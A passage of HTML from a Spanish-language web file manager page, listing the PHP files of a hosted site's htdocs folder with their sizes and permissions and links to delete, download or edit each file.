                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">cambioex.php</a></td>
                    <td>Archivo</td>
                    <td>1012 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">chat.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">chatx.php</a></td>
                    <td>Archivo</td>
                    <td>3.28 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">clima.php</a></td>
                    <td>Archivo</td>
                    <td>421 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">comentario-borrar.php</a></td>
                    <td>Archivo</td>
                    <td>887 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">comentario3.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.83 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">conectados.php</a></td>
                    <td>Archivo</td>
                    <td>3.45 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">contacto-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">contacto.php</a></td>
                    <td>Archivo</td>
                    <td>1.24 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">datos_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.19 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">denuncia-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">denuncia-publica-form.php</a></td>
                    <td>Archivo</td>
                    <td>7.2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">denuncia-publica.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">denuncia.php</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">denuncias.php</a></td>
                    <td>Archivo</td>
                    <td>6.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">edicion.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">edicion.php</a></td>
                    <td>Archivo</td>
                    <td>1.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>8.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">enlazanos.php</a></td>
                    <td>Archivo</td>
                    <td>2.85 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">favoritos-borrar2.php</a></td>
                    <td>Archivo</td>
                    <td>218 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">favoritos.php</a></td>
                    <td>Archivo</td>
                    <td>4.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">favoritos.post.add.php</a></td>
                    <td>Archivo</td>
                    <td>810 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">header.php</a></td>
                    <td>Archivo</td>
                    <td>34.82 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">home.php</a></td>
                    <td>Archivo</td>
                    <td>1.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>15.42 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">login.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">mapa-del-sitio.php</a></td>
                    <td>Archivo</td>
                    <td>2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">miavatar_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>812 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">misimagenes.php</a></td>
                    <td>Archivo</td>
                    <td>3.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">misimagenes_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>987 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
